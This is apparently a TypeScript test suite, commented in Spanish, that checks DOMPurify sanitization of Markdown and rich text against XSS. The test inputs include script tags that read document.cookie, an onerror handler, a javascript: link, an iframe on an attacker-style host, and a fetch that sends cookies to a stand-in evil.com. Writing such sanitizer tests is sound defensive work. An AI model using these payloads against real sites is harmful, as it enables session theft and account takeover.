import { ContentRenderingService, SanitizationProfile } from '../content-rendering.service';

/**
 * OLA 2 — PUNTO 6.
 *
 * content-rendering.service.spec.ts mockea DOMPurify por completo — esos
 * tests en verde no prueban nada sobre la sanitización real. Esta suite NO
 * mockea nada: usa el DOMPurify + JSDOM reales, exactamente como corren en
 * producción. Cubre los casos exigidos por ADR 07 (script, onerror,
 * `[texto](javascript:...)`, iframe de host no permitido) más un caso
 * positivo (tabla y bloque de código sobreviven intactos).
 */
describe('ContentRenderingService — sanitización real (Ola 2, Punto 6, sin mocks)', () => {
  let service: ContentRenderingService;

  beforeEach(() => {
    service = new ContentRenderingService();
  });

  describe('renderMarkdownToHtml — perfil RICH (render-time)', () => {
    it('elimina <script> incrustado directamente en el Markdown', async () => {
      const html = await service.renderMarkdownToHtml(
        'Texto seguro <script>alert(document.cookie)</script> más texto.',
      );
      expect(html).not.toContain('<script');
      expect(html).not.toContain('alert(document.cookie)');
      expect(html).toContain('Texto seguro');
    });

    it('elimina manejadores onerror= aunque la etiqueta sobreviva', async () => {
      const html = await service.renderMarkdownToHtml('<img src="x" onerror="alert(1)">');
      expect(html).not.toContain('onerror');
      expect(html).not.toContain('alert(1)');
    });

    it('elimina el esquema javascript: de un enlace generado por sintaxis Markdown', async () => {
      const html = await service.renderMarkdownToHtml('[haz click aquí](javascript:alert(document.cookie))');
      expect(html).not.toContain('javascript:');
      expect(html).not.toContain('alert(document.cookie)');
      // El texto del enlace es inocuo y puede sobrevivir; lo que no debe
      // sobrevivir es el href peligroso.
      expect(html).not.toMatch(/href\s*=\s*"javascript:/i);
    });

    it('elimina un <iframe> de un host no permitido (fuera de la lista blanca de embebibles)', async () => {
      const html = await service.renderMarkdownToHtml(
        '<iframe src="https://evil.attacker.example.com/steal-cookies"></iframe>',
      );
      expect(html).not.toContain('<iframe');
      expect(html).not.toContain('evil.attacker.example.com');
    });

    it('CASO POSITIVO: conserva intactos una tabla y un bloque de código', async () => {
      const markdown =
        '| Header | Otro |\n|---|---|\n| celda 1 | celda 2 |\n\n```javascript\nconst x = 1 + 1;\n```';
      const html = await service.renderMarkdownToHtml(markdown);

      expect(html).toContain('<table>');
      expect(html).toContain('<td>celda 1</td>');
      expect(html).toContain('<td>celda 2</td>');
      expect(html).toContain('<pre>');
      expect(html).toContain('<code');
      expect(html).toContain('const x = 1 + 1;');
    });

    it('CASO POSITIVO: conserva un <iframe> de un host permitido (YouTube)', async () => {
      const html = await service.renderMarkdownToHtml(
        '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>',
      );
      expect(html).toContain('<iframe');
      expect(html).toContain('www.youtube.com');
    });
  });

  describe('sanitizeRichText — escritura, perfil RICH (conserva Markdown)', () => {
    it('conserva la sintaxis Markdown sin convertirla a HTML', () => {
      const markdown = '# Título\n\nTexto en **negrita** y `código en línea`.';
      expect(service.sanitizeRichText(markdown)).toBe(markdown);
    });

    it('elimina un <script> incrustado en el texto fuente antes de guardarlo', () => {
      const result = service.sanitizeRichText('Texto <script>fetch("//evil.com/"+document.cookie)</script> normal.');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('evil.com');
      expect(result).toContain('Texto');
      expect(result).toContain('normal.');
    });
  });

  describe('escapePlainText — escritura y lectura, perfil PLAIN (estudiante / IA)', () => {
    it('elimina cualquier etiqueta HTML, incluido su contenido para <script>', () => {
      const result = service.escapePlainText('<b>hola</b> <script>alert(1)</script> mundo');
      expect(result).not.toContain('<b>');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert(1)');
      expect(result).toContain('hola');
      expect(result).toContain('mundo');
    });

    it('un estudiante no puede inyectar marcado en su feedback', () => {
      const result = service.escapePlainText('<img src=x onerror=alert(document.cookie)>Mi respuesta fue 42');
      expect(result).not.toContain('<img');
      expect(result).not.toContain('onerror');
      expect(result).toContain('Mi respuesta fue 42');
    });
  });

  describe('renderMarkdownToHtml — perfil PLAIN explícito', () => {
    it('no produce ningún HTML aunque el texto contenga sintaxis Markdown', async () => {
      const html = await service.renderMarkdownToHtml('# Esto no debería ser un título\n\n<b>ni esto negrita</b>', SanitizationProfile.PLAIN);
      expect(html).not.toContain('<h1>');
      expect(html).not.toContain('<b>');
    });
  });
});
